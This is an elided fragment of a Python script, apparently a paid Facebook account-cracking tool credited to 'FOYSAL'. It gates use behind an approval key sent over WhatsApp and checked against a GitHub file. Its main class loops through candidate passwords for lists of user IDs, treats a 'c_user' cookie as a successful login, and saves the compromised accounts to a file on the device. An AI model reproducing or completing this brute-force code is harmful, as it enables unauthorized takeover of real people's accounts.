...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://wa.me/+01854521971?text=' + tks)

        

    r1=requests.get("https://github.com/FOYSAL-101/Test/blob/main/Test.txt").text
    ...
    if key1 in r1:
        ...
        print ("         ༄•───────────────────────────────────────•༄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL FOYSAL")     
...
--------------------------------------------------
[•] AUTHOR     : \033[1;32mFOYSAL\033[1;37m
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[KHAN]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    open('/sdcard/KHAN_OK.txt' , 'a').write('%s\n' % wrt)
